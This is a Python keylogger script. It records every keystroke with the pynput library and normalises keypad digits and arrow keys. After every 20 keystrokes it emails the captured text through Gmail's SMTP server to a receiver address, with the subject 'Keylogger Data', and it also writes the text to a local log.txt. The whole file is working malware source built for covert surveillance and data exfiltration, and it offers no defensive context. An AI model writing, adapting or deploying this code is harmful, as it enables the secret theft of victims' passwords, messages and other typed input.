from pynput.keyboard import Listener, Key
from email.message import EmailMessage
import ssl
import smtplib

logged_keys = []
keystroke_count = 0

password='Password as application not Login'
def send_file():
    # Your existing send_file function code
    email_sender = 'Sender-EMAIL'
    email_password = password
    email_receiver = 'RECEIVER-EMAIL'
    subject = "Keylogger Data"

    # Convert logged_keys list to a string for the email body
    body = ''.join(logged_keys)

    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)  # Set the email body content

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.send_message(em)

def write_to_file(key):
    global logged_keys, keystroke_count

    letter = str(key)
    letter = letter.replace("'", "")

    if key == Key.space:
        letter = " "
    elif key == Key.shift_r:
        letter = ""
    elif key == Key.ctrl_l:
        letter = ""
    elif key == Key.enter:
        letter = "\n"
    elif hasattr(key, 'vk') and key.vk == 96:
        letter = "0"
    elif hasattr(key, 'vk') and key.vk == 97:
        letter = "1"
    elif hasattr(key, 'vk') and key.vk == 98:
        letter = "2"
    elif hasattr(key, 'vk') and key.vk == 99:
        letter = "3"
    elif hasattr(key, 'vk') and key.vk == 100:
        letter = "4"
    elif hasattr(key, 'vk') and key.vk == 101:
        letter = "5"
    elif hasattr(key, 'vk') and key.vk == 102:
        letter = "6"
    elif hasattr(key, 'vk') and key.vk == 103:
        letter = "7"
    elif hasattr(key, 'vk') and key.vk == 104:
        letter = "8"
    elif hasattr(key, 'vk') and key.vk == 105:
        letter = "9"
    elif key == Key.up:
        letter = "↑"
    elif key == Key.down:
        letter = "↓"
    elif key == Key.left:
        letter = "←"
    elif key == Key.right:
        letter = "→"

    # Handling backspace
    elif key == Key.backspace:
        if len(logged_keys) > 0:
            logged_keys = logged_keys[:-1]
        return

    logged_keys.append(letter)
    keystroke_count += 1

    # Check if the keystroke count reaches 20
    if keystroke_count == 20:
        send_file()  # Call the send_file function after 20 keystrokes
        keystroke_count = 0  # Reset keystroke count after sending the file

    # Write logged keys to file (you can adjust this to write at specific intervals)
    with open("log.txt", "w") as f:
        f.write(''.join(logged_keys))  # Write the entire content of logged_keys to the file

with Listener(on_press=write_to_file) as l:
    l.join()
